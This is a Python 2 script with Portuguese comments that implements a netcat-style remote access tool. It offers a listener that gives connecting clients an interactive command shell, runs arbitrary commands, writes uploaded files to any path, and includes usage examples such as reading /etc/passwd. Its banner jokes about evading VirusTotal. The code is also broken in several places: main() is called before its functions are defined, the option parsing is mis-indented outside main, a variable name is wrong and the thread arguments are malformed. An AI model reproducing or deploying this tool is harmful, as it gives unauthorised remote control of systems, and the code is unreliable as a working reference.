#coding:utf8
#! /usr/bin/env python

import sys
import socket
import getopt
import threading
import subprocess



#-------------------------------------------------#

#variaveis globais

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

#------------------------------------------------#

# comandos #
def usage():
    print "PW --> HIDE_AND_SEEK"
    print
    print " - T²SN -"
    print 
    print "Use com: ttsn.py -t target_host -p port"
    print "-l --listen interceptar conexões de [host:port]"
    print "-e --execute=arquivo  executa o arquivo em cima da conexão "
    print "-c --command  executa um shell"
    print "-u --upload=destino manda um arquivo ao alvo"
    
    
    print
    print
    
    print "Exemplos:"
    print
    print "ttsn.py  -t 192.168.0.1 -p 5555 -l -c"
    print
    print "ttsn.py -t 192.158.0.1 -p 5555 -l -u=c:\\target.exe"
    print
    print "ttsn.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print
    print "echo 'VIRUS TOTAL E UM LIXO' | ./ttsn.py -t 192.168.0.1 -p 135"
    sys.exit(0)    



#----------------------------------------------------------#

#definindo metodo inicial#

def main():
    
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
#opções do comando


try:
    opts, args= getopt.getopt(sys.argv[1:], "hle:t:p:cu",
                              ["ajuda","listen","execute","target","port","command","upload"])
except getopt.GetoptError as err:
    print str(err)
    usage()
    
for o,a in opts:
    if o in("-h","--help"):
        usage()
    elif o in("-l","--listen"):
        listen = True
    elif o in ("-e","--excute"):
        execute = a
    elif o in ("-c","-commandShell"):
        command = True
    elif o in ("-u","--upload"):
        upload_destination = a
    elif o in ("-t","--target"):
        target = a
    elif o in ("-p","--port"):
        port = int(a)
    else:
        assert False,"Opção invalida"
        

#-----------------------------------------------------------#
#  tratamento paraouvir e enviarpelo stdin #

if not listen and len(target) and port > 0:
    # Ler na linha de comando
    #aperte CTRL D caso nao tenha input para stdin
    
    buffer= sys.stdin.read()
    
    #data off
    
    client_sender(buffer)
    
    # escutar e executar os comandos
    
    if listen:
        server_loop()
        
main()
    
    
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        
        #conectar no host
        
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
            
            while True:
                #esperando resposta
                recv_len = 1
                response = ""
                
                while recv_len:
                    
                    data = client.recv(4096)
                    recv.len = len(data)
                    response+=data
                    
                    if recv_len < 4096:
                        break
                
                print response,
                
                # esperando nova entrada
                
                buffer=raw_input("")
                buffer+= "\n"
                
                #volta
                
                client.send(buffer)
                
    except:
        print "[*]- Exception,Exiting"
        #derruba conexao
        
        client.close()
        
        
def server_loop():
    global target
    # se nenhum alvo e definido,escuta interfaces
    
    if not len(target):
        target= "0.0.0.0"
        
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        client_socket,addr=  server.accept()
        #thread para cliente
        
        client_thread = threading.Thread(target=client_handler,args=(client_socket))
        client_thread.start()
        
        
def run_command(command):
    #nova linha
    
    command=command.rstrip()
    #executar comando e obter saida de volta
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output="- Comando invalido \r\n"
        #mandar saidapara o cliente
    return output        





#upload de arquivos logica

def client_handler(client_socket):
    
    
    global upload
    global command
    global execute
    
    
    # verifica upload
    
    if len(upload_destination):
        
        #ler bytes apontar destino
        file_buffer=""
        
        # laço de leitura
        while True:
            data= client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer+=data
                
        # escrever bytes
        
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            #analise de arquivo
            
            client_socket.send("Arquivo salvo em : %s\r\n" %upload_destination)
        except:
            client_socket.send("Erro ao salvar em : %s\r\n" %upload_destination)
            
            
    #execução de comando
            
    if len (execute):
        #comando
        
        output = run_command(execute)
        client_socket.send(output)
        
        #ciclo shell requisitado
        
    if command:
        while True:
            #exibir shell
            client_socket.send("<t²sn:#> ")
            #avanço de linha
            cmd_buffer=""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024)
            #retornar comando
            response= run_command(cmd_buffer)
            
            #retornar response
            client_socket.send(response)
                